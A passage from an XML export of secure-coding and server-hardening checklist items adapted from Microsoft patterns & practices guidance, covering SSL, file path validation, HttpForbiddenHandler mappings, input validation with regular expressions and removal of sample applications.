&lt;li&gt;Make the page size as small as possible. &lt;/li&gt;&lt;li&gt;Avoid using graphics that have large file sizes. If you use graphics, use graphics that have smaller file sizes and resolution or&amp;nbsp;use graphics from a site that is not secure. However, when you use graphics from a site that is not secure, some Web browsers
 display a dialog box that asks the user if the user wants to display the content from the site that is not secure.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c09d1ff0-13b5-47a7-99a7-bdf692d2ff25</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Sensitive Data Passed Over Wire is Secured using SSL or IPSec, Where Appropriate</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application uses SSL or IPSec to secure sensitive data that is passed over&amp;nbsp;the&amp;nbsp;wire.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Determine&amp;nbsp;where items of sensitive data, such as credentials and application-specific data, are transmitted over a network link. If you need to send sensitive data between the Web server and browser, consider using SSL. If you need to protect server-to-server
 communication, such as between your Web server and database, consider IPSec or SSL.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ca0d92eb-25a5-4904-923f-02eb9af3b1a4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Write access only on folders that support content authoring and are configured for authentication</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that write permissions are configured&amp;nbsp;only on folders that allow content authoring. Grant write access only to content authors. Also the folders that support content authoring should be configured to require authentication and SSL for encryption.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ca0e3ebf-1ddc-4141-b2e7-81d8a12d3292</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application Avoids File Name and Path Input</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Unless absolutely necessary, the application should not accept file names or file paths as input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Malicious file input can be used to coerce your application into accessing arbitrary files and resources.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check for this problem:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all sources of input in your application. &lt;/strong&gt;During design time identify all of the potential sources of input to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list
 that you can use in the following steps.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine if any source of input provides file or path information. &lt;/strong&gt;
Examine each source of input and determine if it is used to generate a file name or file path.&amp;nbsp;Look not only for sources of input that provide full paths or file names but also for user input that could be used to modify the internal generation of paths and
 file names.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;If user control over file paths or file names is not absolutely necessary, remove the responsible code from the application.&lt;/p&gt;
&lt;p&gt;If the functionality is critical to the proper working of the application, then validate the input for directory traversal and canonicalization attacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check File Names. &lt;/strong&gt;Ensure that file paths only refer to files within your application's virtual directory hierarchy if that is appropriate. When checking file names, obtain the full name of the file by using the
&lt;strong&gt;System.IO.Path.GetFullPath&lt;/strong&gt; method. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check File Paths. &lt;/strong&gt;If you use &lt;strong&gt;MapPath&lt;/strong&gt; to map a supplied virtual path to a physical path on the server, use the overloaded
&lt;strong&gt;Request.MapPath&lt;/strong&gt; method that accepts a &lt;strong&gt;bool&lt;/strong&gt; parameter so that you can prevent cross-application mapping:
&lt;/p&gt;
&lt;pre&gt;try&lt;br&gt;{&lt;br&gt;  string mappedPath = Request.MapPath( inputPath.Text,&lt;br&gt;                                       Request.ApplicationPath, false);&lt;br&gt;}&lt;br&gt;catch (HttpException)&lt;br&gt;{&lt;br&gt;  // Cross-application mapping attempted&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The final &lt;strong&gt;false&lt;/strong&gt; parameter prevents cross-application mapping. This means that a user cannot successfully supply a path that contains &amp;quot;..&amp;quot; to traverse outside of your application's virtual directory hierarchy. Any attempt to do this results
 in an exception of type &lt;strong&gt;HttpException&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:4ce86b45-ffb7-4646-9f8f-01f87be439da"&gt;Checklist Item: If Input File Names Are Required, They Are Well Formed and Are Verifiably Valid Within the Application Context
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:581e8fff-7841-49ac-8bbe-d74e44aa9bd8"&gt;Checklist Item: All Input is Validated For Length, Range, Format, and Type&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:06365970-3114-4529-babc-291614a2f794"&gt;Guideline: Do not Accept File Names or Paths from Users&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cd0b8153-7b59-4222-947c-f9294ff4dda9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unnecessary ASP.NET file type extensions are mapped to "HttpForbiddenHandler" in Machine.config.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unnecessary ASP.NET file type extensions are mapped to &amp;quot;HttpForbiddenHandler&amp;quot; in Machine.config.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The following .NET&amp;nbsp;Framework file extensions are mapped to aspnet_isapi.dll: .asax,&amp;nbsp;.ascx, .ashx, .asmx, .aspx, .axd, .vsdisco, .jsl, .java, .vjsproj, .rem, .soap, .config, .cs, .csproj, .vb, .vbproj, .webinfo, .licx, .resx, and .resources.&lt;/p&gt;
&lt;p&gt;The .NET Framework protects file extensions that should not be directly called by&amp;nbsp;clients by associating them with
&lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt; in Machine.config. The following file extensions are mapped to
&lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt; by default: .asax, .ascx, .config, .cs, .csproj,&amp;nbsp;.vb,&amp;nbsp;.vbproj, .webinfo, .asp, .licx, .resx, and .resources.&lt;/p&gt;
&lt;p&gt;For more information on HTTP handlers, see &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302432.aspx#c16618429_024"&gt;
Step 16. Machine.Config&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Additional Considerations&lt;/h3&gt;
&lt;p&gt;Because IIS processes a Web request first, you could map .NET&amp;nbsp;Framework file extensions that you do not want clients to call, to the 404.dll directly. This does two&amp;nbsp;tasks:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The 404.dll handles and rejects requests before they are passed to ASP.NET and before they are processed by the ASP.NET worker process. This eliminates unnecessary processing by the ASP.NET worker process. Moreover, blocking requests early is a good security
 practice. &lt;/li&gt;&lt;li&gt;The 404.dll returns the message &amp;quot;HTTP 404 - File not found&amp;quot; and &lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt; returns the message &amp;quot;This type of page is not served.&amp;quot; Arguably, the &amp;quot;File not found&amp;quot; message reveals less information and thus could be considered
 more secure.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cd912611-c89d-44cd-ab4c-831af27b2738</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protected resources are mapped to HttpForbiddenHandler.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that Protected resources are mapped to HttpForbiddenHandler.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;HTTP handlers are located in the Machine.config file beneath the &lt;strong&gt;&amp;lt;httpHandlers&amp;gt;
&lt;/strong&gt;element. HTTP handlers are responsible for processing Web requests for specific file&amp;nbsp;extensions. Remoting should not be enabled on front-end Web servers; enable remoting only on middle-tier application servers that are isolated from the Internet.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If you are running .NET 2.0, the &amp;lt; httpHandlers&amp;gt; setting is located in the machine-level Web.config file, located in the same directory as the Machine.config file.&lt;/blockquote&gt;
&lt;p&gt;The following file extensions are mapped in the Machine.config file to HTTP&lt;strong&gt;
&lt;/strong&gt;handlers: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.aspx is used for ASP.NET pages &lt;/li&gt;&lt;li&gt;.rem and .soap are used for Remoting. &lt;/li&gt;&lt;li&gt;.asmx is used for Web Services. &lt;/li&gt;&lt;li&gt;.asax, .ascx, .config, .cs, .csproj, .vb, .vbproj, .webinfo, .asp, .licx, .resx,&amp;nbsp;and&amp;nbsp;.resources are protected resources and are mapped to
&lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For .NET&amp;nbsp;Framework resources, if you do not use a file extension, then map the extension to
&lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt; in the Machine.config file, as shown in the following example:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;add verb=&amp;quot;*&amp;quot; path=&amp;quot;*.vbproj&amp;quot; type=&amp;quot;System.Web.HttpForbiddenHandler&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In this case, the .vbproj file extension is mapped to &lt;strong&gt;System.Web.HttpForbiddenHandler&lt;/strong&gt;. If a client requests a path that ends with .vbproj, then ASP.NET returns a message that states &amp;quot;This type of page is not served.&amp;quot;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The following guidelines apply to handling .NET&amp;nbsp;Framework file extensions: &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Map extensions you do not use to HttpForbiddenHandler&lt;/strong&gt;. If you do not serve ASP.NET pages, then map .aspx to
&lt;strong&gt;HttpForbiddenHandler&lt;/strong&gt;. If you do not use Web Services, then map .asmx to
&lt;strong&gt;HttpForbiddenHandler&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Disable Remoting on Internet-facing Web servers&lt;/strong&gt;. Map remoting extensions (.soap and .rem) on Internet-facing Web servers to
&lt;strong&gt;HttpForbiddenHandler&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Disable .NET&amp;nbsp;Remoting&lt;/h3&gt;
&lt;p&gt;To disable .NET&amp;nbsp;Remoting disable requests for .rem and .soap extensions, use the following elements beneath&lt;strong&gt; &amp;lt;httpHandlers&amp;gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;add verb=&amp;quot;*&amp;quot; path=&amp;quot;*.rem&amp;quot; type=&amp;quot;System.Web.HttpForbiddenHandler&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;add verb=&amp;quot;*&amp;quot; path=&amp;quot;*.soap&amp;quot; type=&amp;quot;System.Web.HttpForbiddenHandler&amp;quot;/&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;This does not prevent a Web application on the Web server from connecting to a downstream object by using the Remoting infrastructure. However, it prevents clients from connecting to objects on the Web server.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cde74aa2-6924-48f3-92a1-96a857d5e0f6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All the Input is Validated For Length, Range, Format, and Type</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check for input that is not passed through a validation routine. Validation routines should check for length, range, format, and type. Validation should check first&amp;nbsp;for known valid and safe data and then for malicious, dangerous data.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your application's vulnerabilities. Input validation on its own is not sufficient; output encoding is also needed to fully
 prevent these attacks.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, use the following steps:&amp;nbsp;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all sources of input in your application.&lt;/strong&gt; During design time, identify all of the potential sources of input to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a
 list that you can use in the following steps.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink.&lt;/strong&gt; Trace each of source of input through your application until you find its ultimate destination. The final sink may be in memory, on the hard drive, sent over the network or stored in a database.&amp;nbsp;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines.&lt;/strong&gt; Each input source should have a data validation routine associated with it. Ideally the validation will occur as soon after the input reaches your application as possible. Shared validation routines are better
 than creating many spread throughout your code base, so check for consolidation of routines to aid testing and reduce the chance of one-off bugs. If an input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validation routines.&lt;/strong&gt; Validation routines&amp;nbsp;should check for length, range, format, and type. Validation should check first&amp;nbsp;for known valid and safe data and then for malicious, dangerous data. Do not rely on filtering out
 all malicious data, as&amp;nbsp;it is too easy to miss something. Do not rely on client-side validation alone as it can be easily bypassed.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Check for known good data and constrain input by validating it for type, length, format, and range. For Web form applications that obtain input through server controls, use the ASP.NET validator controls, such as the RegularExpressionValidator, RangeValidator,
 and CustomValidator, to validate and constrain input. Check all numeric fields for type and range. If you are not using server controls, you can use regular expressions and the Regex class, and you can validate numeric ranges by converting the input value
 to an integer or double and then performing a range check.&amp;nbsp;Validate your input against the least permissive expression possible that will accept all the input you expect for that field. If you know that the field will have certain internal structure, check
 for it. If your input has an internal checksum, like a credit card number, check for&amp;nbsp;that too.
&lt;/p&gt;
&lt;p&gt;Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies.&amp;nbsp;Validate input from all of these sources to help prevent injection attacks. Use regular expressions to help validate input.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;The following example shows how to use the Regex class:&lt;/p&gt;
&lt;pre&gt;using System.Text.RegularExpressions ;&lt;br&gt; // Instance method:Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;]));&lt;br&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;],@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;))&lt;br&gt; {&lt;br&gt;   // Name does not match expression&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If you cannot cache your regular expression for frequent use, you should use the static IsMatch method where possible for performance reasons,&amp;nbsp;which helps&amp;nbsp;avoid unnecessary object creation.
&lt;/p&gt;
&lt;p&gt;Remember that validating input does not remove the need to format output, parameterize queries, or otherwise handle user input carefully.
&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET applcation contains an order form for a web store which has several fields, specifically, a name, address, phone number, item number, and quantity. Each item is simply added to the database, with any typecasting handled by the database. While
 casting to the appropriate type helps a little, it happens too late to prevent SQL injection issues. Furthermore, there are no guarantees about the quality of the data.
&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application contains an order for for a web store. Each of the forms fields are validated, giving stronger guarantees about the data gathered.&amp;nbsp;The phone number&amp;nbsp;is validated as a string of ten digits (after stripping all non-numeric characters),
 or a variable number of digits beginning with the character '&amp;#43;' if international numbers are allowed.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Validating a name, address, and item number can all be a bit more complicated.&amp;nbsp;The first order of business is determining the legal character set for each case. For names spaces, upper and lower case letters (including the accented forms for your current
 codepage), and possible numbers and periods are enough.&amp;nbsp;Addresses need to add commas, hyphens, and number signs, at a minimum.&amp;nbsp;Validating item numbers may be as simple as casting to an integer and checking that the result is in the right range, or it may mean
 a more complicated regular expression that checks for internal formatting in a string.
&lt;/p&gt;
&lt;p&gt;The last, optional step of data validation is to ensure that the data refers to a valid things.&amp;nbsp;The data should be validated for format first, especially as further checks may require database queries. Item numbers are an obvious thing to check for existence
 in the DB, and this would normally happen as part of the stored procedure which creates a new order, but names, addresses, and phone numbers can be similarly checked some times.&amp;nbsp;For example, if the address field is broken up into components, state or province
 information, zip/post codes, and city names, at a minimum, can all be validated against existing lists.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:8a220644-4285-423d-9ebc-7f9069a038a5"&gt;Guideline: Validate Input from All Sources For Type, Length, Format, and Range&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ce32cef6-e386-4348-b294-a562f7cd995b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Latest patches and updates are installed.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the latest patches and updates are installed for your network firewall.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Subscribe to alert services provided by the manufacturer of your firewall and operating system to stay current with both security issues and service patches.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d022ebb5-71d5-49f6-b7e8-93606bee7a42</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Sample applications are removed (\WINNT\Help\IISHelp, \Inetpub\IISSamples).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that sample applications are removed&amp;nbsp;to reduce the areas where your web server can be attacked.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Sample applications are typically not configured with high degrees of security. It is possible that an attacker could exploit an inherent weakness in a sample application or in its configuration to attack your Web site.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d26c55c7-6736-4afb-85f4-9759afa66552</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>User-Supplied Filenames and Paths are Validated</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check that filenames and path input are carefully validated. Verify that whitelist techniques are used when validating input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Filenames and paths interact directly with the underlying filesystem. Allowing malicious users to manipulate file system operations either&amp;nbsp;directly or indirectly through their input can expose important sensitive system files. Canonicalization vulnerabilities
 can result in an attacker gaining access to unexpected resources.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;An application can take input via various ways such as a web interface, database, file system or other software running on the server. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input that include file names and paths. &lt;/strong&gt;
During design time, identify all of the potential input sources to your application. Scour the source code to discover sources of input that may have been missed in your application's design. The most common entry points are:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers (host, accept types, www authentication, cache settings, encodings, etc)
&lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other services running on the system &lt;/li&gt;&lt;li&gt;Javascript variables &lt;/li&gt;&lt;li&gt;File upload and attributes (filename, size, data, etc) &lt;/li&gt;&lt;li&gt;DNS results or host names &lt;/li&gt;&lt;li&gt;External component call return values (COM, AJAX, ActiveX)&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Input that contains file names and paths may be identified by any of the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;import java.io.*; &lt;/li&gt;&lt;li&gt;BufferedReader &lt;/li&gt;&lt;li&gt;FileReader &lt;/li&gt;&lt;li&gt;FileInputStream &lt;/li&gt;&lt;li&gt;DataInputStream &lt;/li&gt;&lt;li&gt;readLine() &lt;/li&gt;&lt;li&gt;read() &lt;/li&gt;&lt;li&gt;Load() &lt;/li&gt;&lt;li&gt;Marshall()&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink. &lt;/strong&gt;Trace each source of input from the immediate source, through your application, to its final destination. The final sink may be in memory, on the hard drive, sent over the network or stored in a data store
 such as a database. Create a list of the input sources that result in interaction with the file system through creation or modification of file names or paths.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines. &lt;/strong&gt;Each input source should have a validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating many
 throughout the code base and may be located in a single component.&lt;/p&gt;
&lt;p&gt;Validation may be identified by any of the following:&lt;/p&gt;
&lt;ul&gt;
